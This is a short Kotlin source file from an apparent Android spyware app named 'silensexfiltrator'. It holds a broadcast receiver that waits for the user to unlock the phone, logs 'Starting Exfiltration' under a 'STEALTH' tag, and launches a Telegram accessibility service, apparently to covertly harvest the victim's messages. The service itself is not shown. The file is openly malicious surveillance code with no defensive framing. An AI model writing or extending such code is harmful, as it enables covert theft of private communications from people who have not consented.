package com.example.silensexfiltrator

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

class UnlockReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.intent.action.USER_PRESENT") {
            Log.d("STEALTH", "Phone Unlocked. Starting Exfiltration.")
            
            // Start the Accessibility Service to perform actions
            val serviceIntent = Intent(context, TelegramAccessibilityService::class.java)
            context.startForegroundService(serviceIntent)
        }
    }
}
